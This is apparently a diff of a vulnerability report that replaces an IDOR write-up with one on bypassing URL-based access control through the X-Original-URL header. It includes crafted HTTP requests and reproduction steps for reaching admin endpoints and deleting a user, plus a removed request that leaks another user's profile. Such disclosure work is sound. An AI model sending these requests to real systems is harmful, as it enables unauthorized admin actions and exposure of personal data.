@@ -1,37 +1,37 @@
-# IDOR on /api/v1/users/{id}/profile allows unauthorized access to user PII
+# Broken Access Control Allows Unauthorized Admin Actions
 
 ## Description
 
-The `/api/v1/users/{id}/profile` endpoint fails to verify that the authenticated user matches the requested `{id}` parameter. By changing the user ID to another user's ID, an attacker can read that user's full profile, including name, email, phone number, and home address.
+Some applications control access by restricting specific URLs and HTTP methods based on user roles (e.g., denying `POST /admin/deleteUser` for non-admins). However, these defenses can be bypassed if the app or its platform honors non-standard HTTP headers—like `X-Original-URL` or `X-Rewrite-URL`—used to override the requested URL.
 
-## Proof of Concept
+If an application enforces access rules only at a front-end layer but allows the effective URL to be overridden by these headers, attackers can access admin endpoints with crafted requests:
 
 ```
-GET /api/v1/users/1337/profile HTTP/2
-Host: app.example.com
-Authorization: Bearer eyJ...
-Content-Type: application/json
-
----
-
-HTTP/2 200 OK
-
-{
-  "id": 1337,
-  "name": "Integriti",
-  "email": "hunter2@example.com",
-  "phone": "+1-555-5555",
-  "address": "1337 Hackers Ave"
-}
+POST / HTTP/1.1
+X-Original-URL: /admin/deleteUser
+...
 ```
+
+Alternatively, an attacker could exploit the vulnerability as follows:
+
+```
+GET /delete?username=carlos HTTP/1.1
+Host: [target]
+X-Original-URL: /admin
+...
+Cookie: session=[attacker-session-token]
+```
+
+This effectively bypasses URL-based access controls by tricking the backend into processing an unauthorized request.
 
 ## Steps to Reproduce
 
-1. Log in as user A (attacker) at app.example.com/login.
-2. Navigate to your own profile and intercept the request to `/api/v1/users/{your_id}/profile`.
-3. Change the user ID in the path to another user's ID (e.g., 1337).
-4. Observe the full profile data of user 1337 in the response.
+1. Attempt to access `/admin` as a non-admin user—access should be denied.
+2. Send the request to an intercepting proxy (e.g., Burp Repeater).
+3. Change the request line to `/` and add the header `X-Original-URL: /admin`.
+4. Observe successful access to the admin page.
+5. To perform actions (e.g., deleting a user), add parameters to the query string and adjust `X-Original-URL:` (e.g., `X-Original-URL: /admin/deleteUser` and `?username=carlos`).
 
 ## Impact
 
-Any authenticated user can read the full personal profile (name, email, phone, home address) of any other user on the platform by iterating over user IDs.
+This vulnerability allows unauthorized users to perform critical admin actions, such as deleting users or changing configurations. Attackers could compromise data, disrupt service, or take full control of the application.
